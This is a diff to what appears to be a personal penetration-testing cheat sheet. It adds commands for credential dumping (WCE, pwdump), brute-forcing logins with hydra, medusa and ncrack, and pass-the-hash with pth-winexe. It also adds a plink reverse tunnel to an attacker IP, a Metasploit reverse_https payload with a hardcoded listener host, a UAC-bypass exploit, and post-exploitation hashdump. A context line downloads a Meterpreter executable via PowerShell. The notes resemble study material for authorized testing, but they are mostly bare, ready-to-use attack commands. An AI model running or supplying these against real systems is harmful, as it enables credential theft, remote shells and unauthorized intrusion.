@@ -9,7 +9,8 @@ for ip in $(cat file.txt); do mkdir -p "$ip"/{penetration,notes,pillage,remote-e
 ## Parse file data
 cut -d'.' -f1 filename.txt |sort -u
 
-
+## Convert newline to comma
+cat filename.txt | tr '\n' ,
 
 # Wordlist locations
 /usr/share 
@@ -88,7 +89,7 @@ host -l ns DOMAIN.COM
 DNSRECON, DNSENUM
 
 
-#----- PORT SCANNING -----#
+# ----- PORT SCANNING -----#
 SYN SCANNING (half scan) 
 
 ### NMAP SCRIPTS
@@ -111,6 +112,8 @@ nmap -sn 192.168.1.1/24
 -A: Enable OS detection, version detection, script scanning, and traceroute
 
 --open = only display results of open ports
+
+nmap -g88 -sS -Pn -n -p 445 --open --reason 10.10.2.0/24 -oA results
 
 #----- SMB (PORT 139, 445) -----#
 ### Identify smb or netbios services
@@ -158,6 +161,8 @@ python -m SimpleHTTPServer
 ### Transfer to Windows with no broswer
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\name\Desktop\met8888.exe')"
 
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File “YourScript.ps1” 
+
 
 #----- Metasploit -----#
 jobs
@@ -172,6 +177,7 @@ cmd /c
 reg
 msbuild
 wscript
+netstat -an /find "LISTEN"
 
 #----- RDP from LINXU to Win -----#
 rdesktop -u USERID -p PASSWORD IPADDRESS -f
@@ -191,3 +197,154 @@ wget -O exploitName.c https://www.exploit-db.com/download/12932
 ### LINUX
 id
 cat /etc/shadow
+
+#----- Password Dump -----# 
+### Windows (they dump pass hashes from lsas process)
+pwdump and fgdump
+
+### WCE (Windows Credential Editor Can steal ntml hashes from memory)
+wce64.exe -w	
+
+#----- Password Cracking -----# 
+john hashes.txt
+
+### To change password policy
+/etc/john/john.conf
+
+### Medusa
+medusa -h ipAddress -u admin -P password.txt -M http -m DIR:admin -T 20
+
+### Ncrack
+ncrack -v -f --user admin -P password.txt rdp://IPADDRESS,CL=1
+
+### Hydra
+hydra -l admin -P password.txt -v IPADRESS ftp
+
+
+#----- PASS-THE-HASH -----#
+### https://www.hacklikeapornstar.com/all-pth-techniques/
+LM hash for empty password
+aad3b435b51404eeaad3b435b51404ee
+
+NTLM hash for empty password
+31d6cfe0d16ae931b73c59d7e0c089c0
+
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:DUMPEDPASSEDhash
+
+pth-winexe -U administrator% //IPADDRESS cmd
+
+#----- PASSWORD CUSTOMIZING -----#
+
+cewl www.website.com -m6 -w /output/path.txt
+
+#----- Findings -----#
+
+Target Ip Address:
+Target Name:
+Target OS:
+How Discovered:
+Listening Ports:
+Known Vulns:
+Admin Accounts/Passwords:
+Other Accounts/Passwords:
+Misc Notes:
+
+#----- Port Forwarding -----#
+
+/etc/rinetd.conf
+
+#### On victim machine
+plink -l root -pw password AttackerIP -R 3390:127.0.0.1:3389
+
+#### Attacker Machine (Verify if 3390 is listening/connected)
+netstat -antp | grep LISTEN
+rdesktop 127.0.0.1:3390
+
+#----- MetaSploit -----#
+/etc/init.d/postgresql start
+/etc/init.d/metasploit start
+
+help
+show auxilary
+show options
+
+db_import Nmap.xml
+services -p 80
+hosts -u
+services -p * 
+### setg makes metasploit remember settings
+setg RHOTS 10.10.10.1
+
+### meterpreter payload
+sysinfo
+getuid
+search -f *filename.txt
+upload /usr/share/windows-binaries/nc.exe c:\\users\
+download c:\\windows\file.txt /tmp/
+shell
+
+use/windows/meterpreter/reverse_https
+use/windows/meterpreter/reverse_tcp_allports
+
+### Standalone payloads (this will need listner on port 443)
+msfpayload use /windows/meterpreter/reverse_https LHOST=53.232.22.2 LPORT=443 x >/var/www/payload.exe
+
+### Metasploit listener
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST
+set LPORT
+exploit
+
+
+use exploit/widows/local/bypassuac
+show options
+session -l
+set SESSION 1
+set PAYLOAD
+set LHOST 65.3.2.1
+set LPORT 8888
+run
+
+### Metasploit POST EXPLOITATION
+getuid
+getprivs
+hashdump
+background
+ps
+migrate 9829
+sessions -l
+get pid
+
+
+
+# ----- Hash ----- #
+hash-identifier
+
+# ----- Dirbuster ----- #
+dirb http://10.10.2.1 /usr/share/dirb/wordlists/vulns/apache.txt -r -o output.txt
+
+for ip in $(cat webservers80.txt);do dirb http://$ip /usr/share/dirb/wordlists/vulns/apache.txt -r -o $ip/dirb_$ip.txt; done
+
+# ----- TCPDUMP ----- #
+
+tcpdump -nn -i tun0 -s 0
+
+### Show TCP Packet against target 10.10.10.10
+tcpdump -nnx tcp and dst 10.10.10.10
+
+### Show TCP Packet from target 10.10.10.10
+tcpdump -nn udp and src 10.10.10.10
+
+### Show TCP port 80 Packets going to or from host 10.10.10.10
+tcpdump -nn tcp and port 80 and host 10.10.10.10
+
+# dirb summary of findings
+egrep -ir 'found' */dirb*
+
+
+# ----- lair Frameworkd Dockers ----- #
+
+
+#### Import Nmap scans to lair 
+./drone-nmap_darwin_amd64 5T9mjLQEp32g8BXCH /Users/user/Downloads/verions.xml
